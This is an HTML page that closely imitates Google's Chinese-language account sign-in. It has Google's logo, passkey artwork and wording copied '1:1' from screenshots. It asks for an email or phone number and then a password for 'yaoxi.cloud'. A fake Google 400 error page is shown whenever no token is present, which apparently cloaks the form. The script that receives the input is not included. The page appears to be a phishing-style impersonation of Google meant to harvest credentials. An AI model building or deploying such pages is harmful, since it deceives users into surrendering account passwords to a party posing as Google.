<!DOCTYPE html>
<html lang="zh-CN" data-theme="light">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google 帐号 - 统一身份认证</title>
  <link rel="stylesheet" href="accounts-login.css?v=v20261004_105039">
  <!-- Official Cloudflare Turnstile JavaScript API SDK -->
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoaded" async defer></script>
</head>
<body>

  <!-- Floating Theme Switcher -->
  <div class="g-floating-theme">
    <button class="g-theme-btn" id="g-theme-toggle">
      <span>🌙 深色</span>
    </button>
  </div>

  <!-- ========================================================================
       1:1 Google Error 400 Bad Request View (Shown on Direct Access without Token)
       ======================================================================== -->
  <div class="g-400-container" id="g-400-view">
    <div class="g-400-logo">
      <svg viewBox="0 0 24 24" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
      </svg>
    </div>
    <h1 class="g-400-title"><strong>400.</strong> 错误。</h1>
    <p class="g-400-body" id="g-400-body-text">
      请求无效：请求参数不正确或未经授权。
    </p>
    <div class="g-400-footer-hint">这就是我们知道的全部信息。</div>
  </div>

  <!-- ========================================================================
       Central Material 3 Container (Shown ONLY when Token is Valid)
       ======================================================================== -->
  <main class="g-accounts-container" id="g-main-app" style="display: none;">
    <div class="g-card" id="g-card">
      
      <!-- Linear Indeterminate Progress Bar -->
      <div class="g-progress-bar" id="g-progress-bar">
        <div class="g-progress-line-1"></div>
        <div class="g-progress-line-2"></div>
      </div>

      <!-- Left Column Section (Logo, Heading, Subtitle & Account Chip) -->
      <div class="g-card-left">
        <!-- Google Official 4-Color G Logo -->
        <div class="g-logo-row">
          <svg viewBox="0 0 24 24" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
          </svg>
        </div>

        <!-- Title & Subtitle -->
        <h1 class="g-title" id="g-step-title">登录</h1>
        <p class="g-subtitle" id="g-step-subtitle">
          前往 <span class="g-app-domain" id="g-target-app-domain">yaoxi.cloud</span>
        </p>

        <!-- Account Capsule Chip (Hidden by default; shown after user enters email) -->
        <div class="g-account-chip" id="g-account-chip" style="display: none;" title="切换账号">
          <div class="g-account-avatar" id="g-account-avatar">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
            </svg>
          </div>
          <span class="g-account-email" id="g-account-email"></span>
          <svg class="g-account-chevron" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
            <path d="M7 10l5 5 5-5z"/>
          </svg>
        </div>
      </div>

      <!-- Right Column Form Body -->
      <form id="g-auth-form" class="g-card-right" onsubmit="return false;" novalidate>
        
        <!-- ================================================================
             STEP 1: Real Cloudflare Turnstile Human Verification & Username Input
             ================================================================ -->
        <div id="step-username" class="g-step-content active">
          
          <!-- Cloudflare Turnstile Real Account-Level Verification Container -->
          <div class="cf-turnstile-outer">
            <div id="cf-turnstile-box" class="cf-turnstile" data-sitekey="0x4AAAAAAEXamT3iIRWjGCmk" data-action="login" data-theme="auto" data-callback="onTurnstileSuccess" data-error-callback="onTurnstileError" data-expired-callback="onTurnstileExpired"></div>
          </div>

          <!-- Floating Outlined Username Input (Zero Privacy Leak) -->
          <div class="g-textfield" id="g-user-textfield">
            <input type="text" class="g-input" id="g-input-username" placeholder=" " autocomplete="username" />
            <label class="g-label" for="g-input-username">电子邮件地址或电话号码</label>
          </div>
          <div class="g-error-callout" id="g-username-error"></div>

          <div style="margin: 8px 0 24px;">
            <a href="javascript:void(0)" class="g-link" style="font-size: 14px;" onclick="alert('请联系您的管理员获取授权帐号')">忘记了电子邮件地址？</a>
          </div>

          <div style="font-size: 13px; color: var(--g-text-tertiary); line-height: 1.45; margin-bottom: 24px;">
            不是您的电脑？请使用无痕浏览窗口私密登录。<a href="javascript:void(0)" class="g-link">了解详情</a>
          </div>

          <div class="g-actions-row">
            <button type="button" class="g-btn-text" onclick="alert('生产环境提示：请使用受信任的管理凭证登录')">创建账号</button>
            <button type="button" class="g-btn-primary" id="g-btn-username-next">下一步</button>
          </div>
        </div>

        <!-- ================================================================
             STEP 2: Passkey Biometric Assertion (Strictly NO Creation)
             ================================================================ -->
        <div id="step-passkey" class="g-step-content" style="display: none;">
          
          <!-- 1:1 Vector Illustration of Official Google Passkey Multi-factor Graphic -->
          <div class="g-passkey-illustration-wrap">
            <svg class="g-passkey-svg" viewBox="0 0 240 140" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="52" y="24" width="136" height="96" rx="14" fill="#282a2d" stroke="#3c4043" stroke-width="1.5"/>
              <path d="M68 36h28" stroke="#5f6368" stroke-width="2" stroke-linecap="round"/>
              <circle cx="172" cy="36" r="2" fill="#5f6368"/>

              <!-- Small Coral Pink Cross (Top Left) -->
              <path d="M28 38v8M24 42h8" stroke="#f28b82" stroke-width="2.5" stroke-linecap="round"/>

              <!-- Blue Cloud / Security Node Block (Left) -->
              <g transform="translate(42, 48)">
                <rect width="30" height="30" rx="8" fill="#4285f4"/>
                <circle cx="9" cy="9" r="2.5" fill="#ffffff"/>
                <circle cx="21" cy="9" r="2.5" fill="#ffffff"/>
                <circle cx="9" cy="21" r="2.5" fill="#ffffff"/>
                <circle cx="21" cy="21" r="2.5" fill="#ffffff"/>
                <path d="M9 9h12v12H9z" stroke="#ffffff" stroke-width="1.5" stroke-dasharray="2 2" fill="none"/>
              </g>

              <!-- Green Face ID Smile Circle (Bottom Left) -->
              <g transform="translate(24, 76)">
                <circle cx="16" cy="16" r="16" fill="#34a853"/>
                <circle cx="11" cy="13" r="1.5" fill="#133d1c"/>
                <circle cx="21" cy="13" r="1.5" fill="#133d1c"/>
                <path d="M11 19c1.5 2.5 8.5 2.5 10 0" stroke="#133d1c" stroke-width="1.8" stroke-linecap="round"/>
              </g>

              <!-- Orange Fingerprint Circle (Top Right) -->
              <g transform="translate(164, 22)">
                <circle cx="18" cy="18" r="18" fill="#f9ab00"/>
                <path d="M12 18c0-3.3 2.7-6 6-6s6 2.7 6 6" stroke="#5f3b00" stroke-width="1.8" stroke-linecap="round"/>
                <path d="M9 18c0-5 4-9 9-9s9 4 9 9c0 2-.5 4-1.5 5.5" stroke="#5f3b00" stroke-width="1.8" stroke-linecap="round"/>
                <path d="M15 18c0-1.6 1.3-3 3-3s3 1.4 3 3c0 3-1.5 5.5-3 5.5s-3-2.5-3-5.5" stroke="#5f3b00" stroke-width="1.8" stroke-linecap="round"/>
                <path d="M18 20v3.5" stroke="#5f3b00" stroke-width="1.8" stroke-linecap="round"/>
              </g>

              <!-- Screen Lock Pattern / Scan Grid (Bottom Right) -->
              <g transform="translate(148, 62)">
                <rect width="44" height="42" rx="6" fill="#1e1f20" stroke="#5f6368" stroke-width="1.5"/>
                <rect x="8" y="8" width="10" height="10" rx="2" fill="#8ab4f8"/>
                <rect x="26" y="8" width="10" height="10" rx="2" fill="#8ab4f8"/>
                <rect x="8" y="24" width="10" height="10" rx="2" fill="#8ab4f8"/>
                <rect x="26" y="24" width="10" height="10" rx="2" fill="#8ab4f8"/>
                <path d="M4 14V6h8M40 14V6h-8M4 28v8h8M40 28v8h-8" stroke="#a8c7fa" stroke-width="1.5" stroke-linecap="round"/>
              </g>

              <!-- Center Dark Lock Container (User + Key) -->
              <g id="passkey-lock-center" transform="translate(86, 38)">
                <rect width="68" height="68" rx="14" fill="#131314" stroke="#444746" stroke-width="2"/>
                <path d="M26 24a8 8 0 1 0 0-16 8 8 0 0 0 0 16zM12 48v-3c0-4.4 3.6-8 8-8h12c4.4 0 8 3.6 8 8v3H12z" fill="#e3e3e3"/>
                <circle cx="45" cy="38" r="6" fill="#e3e3e3"/>
                <circle cx="45" cy="38" r="3.5" fill="#131314"/>
                <path d="M48 43l8 8M53 48l2-2M56 51l2-2" stroke="#e3e3e3" stroke-width="2.5" stroke-linecap="round"/>
              </g>
            </svg>
          </div>

          <!-- Prompt Subtitle (1:1 with Screenshot) -->
          <p class="g-passkey-prompt-text">
            您的设备会要求您使用指纹、面孔或屏锁设置来验证身份
          </p>

          <div class="g-error-callout" id="g-passkey-error"></div>

          <!-- Bottom Action Buttons (1:1 with Screenshot) -->
          <div class="g-actions-row">
            <button type="button" class="g-btn-text" id="g-btn-passkey-other">
              试试其他方式
            </button>
            <button type="button" class="g-btn-primary" id="g-btn-passkey-continue">
              继续
            </button>
          </div>
        </div>

        <!-- ================================================================
             STEP 2-ALT: "选择其他验证方式" (Choose another way)
             ================================================================ -->
        <div id="step-other-methods" class="g-step-content" style="display: none;">
          <div class="g-other-methods-list">
            
            <!-- Method 1: Passkey -->
            <div class="g-method-item" id="opt-method-passkey">
              <div class="g-method-icon">🔑</div>
              <div class="g-method-info">
                <div class="g-method-title">使用您的通行密钥</div>
                <div class="g-method-desc">使用已保存在此设备上的指纹、面容或屏幕锁定</div>
              </div>
            </div>

            <!-- Method 2: Password Verification -->
            <div class="g-method-item" id="opt-method-password">
              <div class="g-method-icon">🔒</div>
              <div class="g-method-info">
                <div class="g-method-title">输入您的密码</div>
                <div class="g-method-desc">使用您的帐号安全密码进行登录</div>
              </div>
            </div>

            <!-- Method 3: Security Code -->
            <div class="g-method-item" id="opt-method-code" onclick="alert('安全提示：动态验证码通道已通过加密通道保护')">
              <div class="g-method-icon">📱</div>
              <div class="g-method-info">
                <div class="g-method-title">获取安全验证码</div>
                <div class="g-method-desc">在您已登录的受信任移动设备上获取 6 位数字</div>
              </div>
            </div>

          </div>

          <div class="g-actions-row">
            <button type="button" class="g-btn-text" id="g-btn-other-back">返回</button>
            <span></span>
          </div>
        </div>

        <!-- ================================================================
             STEP 3: Password Verification (1:1 with Screenshot)
             ================================================================ -->
        <div id="step-password" class="g-step-content" style="display: block;">
          <div>
            <!-- Official Material 3 Blue Info Callout Banner -->
            <div class="g-callout-banner" id="g-pwd-callout">
              <div class="g-callout-icon">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                </svg>
              </div>
              <div class="g-callout-text">
                不妨选择“试试其他方式”，改用通行密钥更轻松更安全地登录
              </div>
            </div>

            <!-- Outlined Password Textfield -->
            <div class="g-textfield" id="g-pwd-textfield">
              <input type="password" class="g-input" id="g-input-password" placeholder=" " autocomplete="current-password" autofocus />
              <label class="g-label" for="g-input-password">输入您的密码</label>
            </div>
            <div class="g-error-callout" id="g-password-error"></div>

            <!-- Show Password Checkbox (1:1 with Screenshot) -->
            <div class="g-checkbox-row">
              <label class="g-checkbox-label">
                <input type="checkbox" id="g-show-password" class="g-checkbox-input" />
                <span class="g-checkbox-text">显示密码</span>
              </label>
            </div>
          </div>

          <!-- Bottom Action Buttons (1:1 Bottom-Right Placement) -->
          <div class="g-actions-row g-actions-pwd">
            <button type="button" class="g-btn-text" id="g-btn-pwd-other">试试其他方式</button>
            <button type="button" class="g-btn-primary" id="g-btn-password-submit">下一步</button>
          </div>
        </div>

        <!-- ================================================================
             STEP 4: Authentication Success State (Zero Debugging UI)
             ================================================================ -->
        <div id="step-token" class="g-step-content" style="display: none;">
          <div class="g-success-screen">
            <div class="g-spinner-wrap">
              <div class="g-spinner"></div>
            </div>
            <h2 class="g-success-title">正在登录...</h2>
            <p class="g-success-subtitle">验证成功，正在安全返回</p>
          </div>
        </div>

      </form>
    </div>
  </main>

  <!-- Page Footer -->
  <footer class="g-footer">
    <select class="g-lang-select" id="g-lang-select" aria-label="语言选择">
      <option value="zh-CN" selected>简体中文</option>
      <option value="zh-TW">繁體中文</option>
      <option value="en">English (United States)</option>
      <option value="ja">日本語</option>
    </select>
    
    <div class="g-footer-links">
      <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" class="g-footer-link">帮助</a>
      <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" class="g-footer-link">隐私权</a>
      <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" class="g-footer-link">条款</a>
    </div>
  </footer>

  <script src="accounts-login.js?v=v20261004_105039"></script>
</body>
</html>
